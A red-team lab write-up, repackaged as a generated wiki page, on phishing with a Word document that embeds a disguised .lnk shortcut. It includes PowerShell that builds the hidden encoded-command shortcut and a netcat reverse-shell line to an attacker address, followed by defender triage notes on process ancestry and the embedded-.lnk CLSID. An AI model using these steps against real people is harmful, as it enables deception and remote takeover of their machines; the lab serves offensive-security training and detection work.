---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Phishing: OLE + LNK

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-initial-access-phishing-with-ms-office-phishing-ole-lnk` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

This lab explores a popular phishing technique where attackers embed .lnk files into the Office documents and camouflage them with Ms Word office icons in order to deceive victims to click and run them.

## Preserved Body

````markdown
This lab explores a popular phishing technique where attackers embed .lnk files into the Office documents and camouflage them with Ms Word office icons in order to deceive victims to click and run them. 

## Weaponization

Creating an .LNK file that will trigger the payload once executed:
```csharp
$command = 'Start-Process c:\shell.cmd'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("c:\experiments\ole+lnk\Invoice-FinTech-0900541.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAHMAaABlAGwAbAAuAGMAbQBkAA=="
$link.save()
```
Powershell payload will trigger a rudimentary NC reverse shell:
```csharp
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```
Once the above powershell script is executed, an `.LNK` shortcut is created:

![](<../../../_assets/ole-lnk-shortcut-created.png>)

Let's create a Word document that will contain the malicious shortcut that was created in the previous step:

![](<../../../_assets/ole-good-document.png>)

Let's insert a new object into the document by selecting a `Package`and changing its icon source to a Microsoft Word executable:

![](<../../../_assets/ole-insert-ole-object-with-icon.png>)

![](<../../../_assets/ole-change-icon.png>)

Point the package to the .lnk file containing the payload:

![](<../../../_assets/ole-payload.png>)

Final result:

![](<../../../_assets/ole-weaponized.png>)

## Execution

Victim executing the embedded document. Gets presented with a popup to confirm execution:

![](<../../../_assets/ole-execution.png>)

Once the victim confirms they want to open the file - the reverse shell comes back to the attacker:

![](<../../../_assets/ole-execution2.png>)
## Observations

After the payload is triggered, the process ancestry looks as expected - powershell gets spawned by winword, cmd is spawned by powershell..:

![](<../../../_assets/ole-ancestry1.png>)

Soon after, the powershell gets killed and cmd.exe becomes an orphaned process:

![](<../../../_assets/ole-ancestry2.png>)

Like in [T1137: Phishing - Office Macros](t1137-office-vba-macros.md), you can use rudimentary tools on your Windows workstation to quickly triage the suspicious Office document. First off, rename the file to a .zip extension and unzip it. Then you can navigate to `word\embeddings` and find `oleObject.bin` file that contains the malicious `.lnk`:

![](<../../../_assets/ole-embedded-bin.png>)

Then you can do a simple `strings` or hexdump against the file and you should immediately see signs of something that should raise your eyebrow\(s\):

```csharp
hexdump.exe -C .\oleObject1.bin
```

![](<../../../_assets/ole-hexdump.png>)

As an analyst, one should look for `CLSID 00021401-0000-0000-c000-000000000046` in the .bin file, which signifies that the .doc contains an embnedded .lnk file. In our case this can be observed here:

![](<../../../_assets/lnk-clsid.png>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/phishing-ole-lnk.md)

## Evidence Excerpt

```text
_asset_filenames:
- lnk-clsid.png
- ole-ancestry1.png
- ole-ancestry2.png
- ole-change-icon.png
- ole-embedded-bin.png
- ole-execution.png
- ole-execution2.png
```
